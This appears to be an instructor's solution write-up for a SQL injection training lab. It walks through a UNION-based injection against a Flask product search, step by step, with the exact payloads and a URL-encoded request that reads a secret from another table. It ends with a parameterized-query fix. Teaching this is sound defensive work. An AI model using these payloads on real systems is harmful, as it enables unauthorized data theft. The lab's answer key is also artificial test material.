# Solution — sqli-union-product-search

<!-- Instructor/authoring reference. Students should try the hints first. -->

> **Architecture note (simplification).** The `data/catalog.json` spec lists an
> `nginx 1.27 reverse proxy` in front of this lab. This implementation **omits**
> nginx: gunicorn binds `0.0.0.0:8080` directly and the container publishes that
> port on `127.0.0.1`. A reverse proxy is a transport detail — it forwards the
> same `category` query parameter to the same Flask handler — so removing it
> changes nothing about the vulnerability, the payload, or the fix, while keeping
> the image small and the single-app hardening posture identical to the other
> Python SQLi labs. The vulnerable stack is app + a hardened non-root MySQL.

## What tipped you off

`/search?category=X` changes the list of records, so `X` clearly reaches SQL.
Submitting a single quote (`?category=jazz'`) returns a raw
`MySQL error: (1064, "You have an error in your SQL syntax ... near '' AND
released=1'")` instead of a clean "no results" page. A server that leaks its SQL
error text is almost always concatenating your input into the statement, and the
error even shows you the tail of the query (`' AND released=1`) — so you know the
exact shape you are injecting into.

## The class of bug

SQL injection (**CWE-89**, OWASP **A03:2021 – Injection**) in a **single-quoted
string context**, exploited as a **UNION-based** read of a _different_ table.
Because the page renders one or more result rows, you can append a second
`SELECT` whose columns line up with the visible query and have your chosen data
printed back to you. The verbose error channel (**CWE-209**) is a secondary
weakness that makes column-count and datatype discovery trivial.

## Vulnerability

`src/app.py`, `/search`:

```python
sql = (
    "SELECT title, artist, price FROM records "
    "WHERE category='" + category + "' AND released=1"
)
```

`category` comes straight from the query string with no quoting, escaping,
parameterization, or allowlisting. The `except` branch then echoes `str(exc)` —
the raw driver error — into the response.

## Why the developer wrote it this way

Concatenating a filter value into a `WHERE` clause is the most "obvious" way to
build a query when you have never been bitten by injection. It reads like a
sentence, it is trivial to `print()` and debug, and it works perfectly for every
value the developer actually tested (`jazz`, `rock`, `electronic`). Echoing the
database error back to the browser is the same instinct one step later: it made
local debugging fast, and nobody circled back to hide it before shipping.

## Why it exists

The database has no way to tell your _data_ apart from your _code_ once both
arrive as one concatenated string. A bound parameter would ship `category` to the
server as a value that can only ever be compared against the `category` column;
concatenation instead lets `'` end the literal and everything after it be parsed
as SQL. The echoed error compounds it: MySQL states exactly _why_ a query failed
(`different number of columns`, `Unknown column`), turning trial-and-error into a
guided oracle.

## The mechanical exploit

1. **Confirm injection + read the tail.** `?category=jazz'` → `(1064, ... near
'' AND released=1')`. You are inside a single-quoted string followed by
   ` AND released=1`.
2. **Find the column count.** `?category=jazz' UNION SELECT 1-- -` →
   `(1222, 'The used SELECT statements have a different number of columns')`.
   Grow it until the error disappears: three columns
   (`UNION SELECT 1,2,3-- -`) succeeds — matching `title, artist, price`.
3. **Place your data in a string column.** `title` is textual, so put the secret
   there and pad the rest with `NULL`:

   ```
   ?category=jazz' UNION SELECT secret,NULL,NULL FROM admin_notes-- -
   ```

   (Mind the space after `--`; MySQL comments are `-- `.)

## Exploit walkthrough

Full URL (URL-encoded), then read the 32-hex secret from the rendered list:

```
GET /search?category=jazz%27%20UNION%20SELECT%20secret%2CNULL%2CNULL%20FROM%20admin_notes--%20-
-> ... <li>{32-hex secret} —  — $</li> ...
```

The concatenation makes the server run:

```sql
SELECT title, artist, price FROM records
WHERE category='jazz' UNION SELECT secret,NULL,NULL FROM admin_notes-- -' AND released=1
```

The `'` closes the `jazz` literal, the `UNION SELECT` appends the `admin_notes`
row (the secret lands in the `title` position), and `-- -` comments out the
dangling ` AND released=1`. Then trade the secret for the flag:

```
GET /solve?token={32-hex secret}   ->   200  FLAG{...}
```

`tests/exploit.py` performs exactly this with the standard library only, extracts
the secret dynamically (it is random per container), and asserts the recovered
flag equals the HMAC-derived expected value. A `information_schema`-based variant
(`UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -` to
discover `admin_notes`, then its columns) is a good exercise for reaching the
same result without prior knowledge of the table name.

## Fix

Never concatenate input into SQL. Bind the value as a parameter so the driver
sends it as data, and stop leaking database errors:

```python
sql = "SELECT title, artist, price FROM records WHERE category=%s AND released=1"
try:
    with conn.cursor() as cur:
        cur.execute(sql, (category,))   # category is a value, never code
        rows = cur.fetchall()
except Exception:
    app.logger.exception("search failed")            # log server-side
    return Response("Search is temporarily unavailable.", status=500)  # generic to client
```

With a bound parameter, `jazz' UNION SELECT ...` is compared literally against the
`category` column and matches nothing — the `'` and the `UNION` never reach the
parser as code. Returning a generic error message removes the CWE-209 oracle. If
you must sort/filter on identifiers (column or table names), map user input to a
fixed server-side allowlist rather than interpolating it.
